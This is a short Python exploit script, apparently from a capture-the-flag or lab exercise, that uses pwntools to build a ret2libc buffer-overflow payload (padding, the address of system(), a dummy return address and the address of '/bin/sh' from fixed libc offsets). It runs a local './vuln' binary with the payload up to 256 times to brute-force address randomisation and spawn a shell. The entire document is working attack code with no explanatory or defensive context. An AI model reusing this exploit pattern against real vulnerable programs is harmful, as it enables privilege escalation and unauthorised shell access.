#!/usr/bin/python
from pwn import *
from subprocess import call
libc_base = 0xf754f000
system_off = 0x040310
binsh_off  = 0x16084c

system = libc_base + system_off
binsh  = libc_base + binsh_off

payload = "A" * 268 + p32(system) + p32(0xdeadeef) + p32(binsh)
i = 256
while (i > 0):
    i -= 1
    p = call(['./vuln',payload])
    if (p):
        print "failed error (" + str(p) + ")"
    else: 
        break
